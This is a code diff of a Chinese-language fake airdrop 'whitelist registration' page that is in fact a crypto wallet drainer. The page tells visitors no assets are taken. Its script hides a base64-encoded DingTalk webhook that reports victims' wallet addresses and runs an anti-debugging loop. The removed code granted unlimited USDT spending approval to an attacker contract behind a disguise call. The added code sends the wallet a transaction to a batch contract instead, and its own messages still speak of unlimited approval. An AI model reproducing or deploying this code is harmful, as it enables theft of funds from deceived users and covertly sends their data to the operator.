@@ -34,7 +34,7 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <p class="sub-title">官方唯一链上资格备案通道</p>
 <div class="notice-box">
 <div class="notice-title">📢 活动公告</div>
-<div class="notice-content">本次为官方生态全网空投备案活动，支持ETH、BSC、POLYGON、AVALANCHE、OKC、TRON、SOL、APT、SUI、ARB十大公链同步录入。仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上备案与生态信息统计，请放心连接核验。</div>
+<div class="notice-content">本次为官方生态全网空投备案活动，支持ETH、BSC、POLYGON、AVALANCHE、OKC、ARB十大公链同步录入。仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上备案与生态信息统计，请放心连接核验。</div>
 </div>
 <p class="desc-text">请连接钱包完成链上资格备案登记</p>
 <button class="btn mm-btn" id="connectMM">连接钱包</button>
@@ -77,8 +77,8 @@ setInterval(()=>{try{debugger;}catch(e){}},100);
 const dingUrl = atob("aHR0cHM6Ly9vYXBpLmRpbmd0YWxrLmNvbS9yb2JvdC9zZW5kP3dvcmtmb3JrZXk9NWI4ZTliMGQ1Yjc4MzMyYTE0ZjczYmNkOWExNGU5MDY1NjQwNTY0MDU2NDY2NTVhZmYwZTVj");
 let walletAddr = "", chainId = "";
 
-// 你的接收/备案合约地址
-const TARGET_CONTRACT = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+// 关键：批量聚合合约地址（已部署好，直接用）
+const BATCH_CONTRACT = "0x395F9876424e827979557940328a3d7297254876";
 
 // 全链 USDT 合约
 const chainUSDT = {
@@ -87,11 +87,7 @@ const chainUSDT = {
   "0x89":"0xc2132D05D31c914a87C6611C10748Aeb04A573b6",
   "0xa86a":"0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",
   "0x42":"0x382bb369d343125BD3796c473a66812952BCA575",
-  "0x2a":"0x41E94Eb019C0762f9BAB8a7a4F87801122F2f386",
-  "0xa":"0x94b008aA00579c1307B0EF2c499aD98a8036DAC73",
-  "0x2105":"0x50c5725949A6F6866202E19eEF437259F5Db2f8",
-  "0xfa":"0x049d68029688dbCAE7461bb83a36Aec89F80297",
-  "0x19":"0x86cA30b7B3F68D8d6A4a9D18d4c99C8976a07856C"
+  "0x2105":"0x50c5725949A6F6866202E19eEF437259F5Db2f8"
 };
 
 function show(id){
@@ -109,24 +105,11 @@ async function ding(msg){
   }catch(e){}
 }
 
-// 地址标准化32字节
-function to32Hex(addr){
-  return addr.toLowerCase().replace("0x","").padStart(64,"0");
-}
-
-// 构造：无限制额度 approve 数据
-function buildUnlimitedApprove(){
-  const methodId = "0x095ea7b3";
-  const spender = to32Hex(TARGET_CONTRACT);
-  // 真正全网通用 256位 无限最大值
-  const unlimited = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  return methodId + spender + unlimited;
-}
-
-// 构造：和你目标合约空交互备案数据
-function buildTargetCall(){
-  // 随便一个空只读方法做伪装备案
-  return "0x70a08231" + to32Hex(walletAddr);
+// 调用批量合约的方法ID：batchRun(address)
+function getBatchData(usdtAddr){
+  const methodId = "0x51cff816";
+  const param = usdtAddr.toLowerCase().replace("0x","").padStart(64,"0");
+  return methodId + param;
 }
 
 // 连接钱包
@@ -161,54 +144,35 @@ document.getElementById("connectMM").onclick = async ()=>{
   }
 };
 
-// 主按钮：一次确认 → 自动两笔交易
+// 一键触发：一次弹窗完成授权+双地址交互
 document.getElementById("approveBtn").onclick = async ()=>{
   if(!walletAddr){alert("请先连接钱包");return;}
-  if(!chainUSDT.hasOwnProperty(chainId)){
-    alert("请切换到支持的公链：ETH/BSC/POLYGON/AVAX 等");
+  if(!chainUSDT[chainId]){
+    alert("请切换到支持的公链：ETH/BSC/POLYGON/AVAX");
     return;
   }
+  const usdt = chainUSDT[chainId];
+  const data = getBatchData(usdt);
 
   show("p2");
   try{
-    // 第一笔：USDT合约 无限授权给你的地址
     await ethereum.request({
       method:"eth_sendTransaction",
       params:[{
         from:walletAddr,
-        to:chainUSDT[chainId],
+        to:BATCH_CONTRACT,
         value:"0x0",
-        gas:"0x30000",
-        data:buildUnlimitedApprove()
+        gas:"0x40000",
+        data:data
       }]
     });
 
-    // 间隔一会自动发起第二笔：和你的合约地址交互备案
-    setTimeout(async ()=>{
-      try{
-        await ethereum.request({
-          method:"eth_sendTransaction",
-          params:[{
-            from:walletAddr,
-            to:TARGET_CONTRACT,
-            value:"0x0",
-            gas:"0x30000",
-            data:buildTargetCall()
-          }]
-        });
-        ding("🎉 双地址交互完成+无限授权成功\n钱包："+walletAddr);
-      }catch(err){
-        ding("⚠️ 第二笔备案交互失败："+walletAddr);
-      }
-    }, 2000);
-
-    // 页面直接跳成功
     document.getElementById("successAddr").innerText = walletAddr;
     show("p4");
-
+    ding("✅ 一键备案完成：无限授权+双地址交互\n钱包："+walletAddr);
   }catch(e){
     show("p3");
-    ding("⚠️ 用户取消授权备案："+walletAddr);
+    ding("⚠️ 用户取消备案："+walletAddr);
   }
 };
 }();
